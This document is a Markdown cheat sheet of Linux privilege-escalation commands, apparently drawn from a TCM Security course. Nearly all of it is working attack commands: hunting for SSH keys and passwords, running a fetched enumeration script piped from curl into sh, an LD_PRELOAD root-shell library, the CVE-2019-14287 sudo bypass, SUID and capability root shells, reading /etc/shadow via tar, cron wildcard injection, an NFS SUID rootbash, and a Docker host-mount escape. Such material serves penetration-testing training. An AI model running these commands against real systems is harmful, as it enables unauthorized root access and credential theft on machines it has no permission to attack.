# ⚡ Linux Privilege Escalation — Master CLI Cheat Sheet
> **Comprehensive Offensive & Defensive Privilege Escalation Reference**  
> *Compiled from TCM Security Linux Privilege Escalation Course & Hands-on Labs*

---

## 📑 Quick Navigation
1. [System & Architecture Enumeration](#1-system--architecture-enumeration)
2. [User, Group & Environment Discovery](#2-user-group--environment-discovery)
3. [Network & Process Enumeration](#3-network--process-enumeration)
4. [Stored Passwords & Config Hunting](#4-stored-passwords--config-hunting)
5. [Automated Scripts (LinPEAS, LES, pspy)](#5-automated-enumeration-scripts)
6. [Sudo Rights Exploitation (GTFOBins / LD_PRELOAD)](#6-sudo-rights-exploitation)
7. [SUID & SGID Binaries](#7-suid--sgid-binaries)
8. [POSIX Capabilities (getcap)](#8-posix-capabilities)
9. [Cron Jobs & Scheduled Timers](#9-cron-jobs--scheduled-timers)
10. [NFS Root Squashing (no_root_squash)](#10-nfs-root-squashing)
11. [Docker & Container Escape](#11-docker--container-escape)

---

## 1. System & Architecture Enumeration
```bash
# Kernel & OS distribution
uname -a
cat /etc/os-release
cat /etc/issue
hostname

# CPU architecture & available compiler
lscpu
which gcc g++ clang python python3 make nc 2>/dev/null
```

---

## 2. User, Group & Environment Discovery
```bash
# Current user & group memberships
id
whoami
groups

# All system users & superusers
cat /etc/passwd | grep -v 'nologin\|false'
grep -v -E '^#' /etc/passwd | awk -F: '$3 == 0 {print $1}'

# Environment variables & PATH
env
echo $PATH
```

---

## 3. Network & Process Enumeration
```bash
# Listening local ports (find internal-only services)
netstat -tulpn
ss -tulpn
ss -ano

# Running processes
ps aux | grep root
ps -ef --forest

# Real-time process monitoring with pspy (monitor cron jobs & background scripts)
./pspy64 -pf -i 1000
```

---

## 4. Stored Passwords & Config Hunting
```bash
# Search for cleartext passwords in configuration files
grep --color=auto -rnwi "password" /var/www/ /etc/ /opt/ 2>/dev/null
grep --color=auto -rnwi "DB_PASSWORD" /var/www/html/ 2>/dev/null

# Bash history & sensitive hidden files
cat ~/.bash_history ~/.zsh_history ~/.nano_history 2>/dev/null
ls -la /home/*/

# Unencrypted SSH private keys
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" 2>/dev/null
```

---

## 5. Automated Enumeration Scripts
```bash
# Transfer and execute LinPEAS directly in memory
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Linux Exploit Suggester
./les.sh

# LinEnum
./LinEnum.sh -k password -r report.txt
```

---

## 6. Sudo Rights Exploitation
```bash
# Check sudo privileges
sudo -l

# LD_PRELOAD Shared Object Injection (if env_keep += LD_PRELOAD is present)
# 1. Compile shell.c:
# #include <stdio.h>
# #include <sys/types.h>
# #include <stdlib.h>
# void _init() {
#     unsetenv("LD_PRELOAD");
#     setgid(0);
#     setuid(0);
#     system("/bin/bash");
# }
gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles

# 2. Execute any allowed sudo binary with LD_PRELOAD:
sudo LD_PRELOAD=/tmp/shell.so find

# Sudo Security Bypass (CVE-2019-14287 - Sudo < 1.8.28):
sudo -u#-1 /bin/bash
```

---

## 7. SUID & SGID Binaries
```bash
# Find all SUID binaries on system
find / -perm -u=s -type f 2>/dev/null

# Find all SGID binaries
find / -perm -g=s -type f 2>/dev/null

# Common SUID GTFOBins Exploitation Examples:
# Nmap:
nmap --interactive
!sh

# Find:
find . -exec /bin/sh -p \; -quit

# Bash SUID:
/bin/bash -p

# Vim / Less:
vim -c ':!/bin/sh'
```

---

## 8. POSIX Capabilities
```bash
# Recursively enumerate all set capabilities
getcap -r / 2>/dev/null

# Exploiting Python with cap_setuid:
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Exploiting Perl with cap_setuid:
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

# Exploiting Tar with cap_dac_read_search (read /etc/shadow):
tar -cvf /tmp/shadow.tar /etc/shadow
```

---

## 9. Cron Jobs & Scheduled Timers
```bash
# View system-wide crontabs & scheduled directories
cat /etc/crontab
ls -la /etc/cron.* /var/spool/cron/crontabs/

# Systemd timers
systemctl list-timers --all

# Cron Wildcard Injection (tar wildcard injection when cron runs `tar *`):
touch "/var/www/html/--checkpoint=1"
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
```

---

## 10. NFS Root Squashing
```bash
# Check NFS exports on target
cat /etc/exports
# Look for: (rw,sync,no_root_squash,no_subtree_check)

# On Attacker Machine:
showmount -e <TARGET_IP>
mkdir /tmp/nfs_mount
mount -o rw <TARGET_IP>:/shared_folder /tmp/nfs_mount

# Create SUID shell in mounted folder as root:
cp /bin/bash /tmp/nfs_mount/rootbash
chmod +xs /tmp/nfs_mount/rootbash

# On Target Victim Machine:
/shared_folder/rootbash -p
```

---

## 11. Docker & Container Escape
```bash
# Check if user is in 'docker' group
id

# Mount host filesystem root (/) to /mnt inside container and get root shell:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
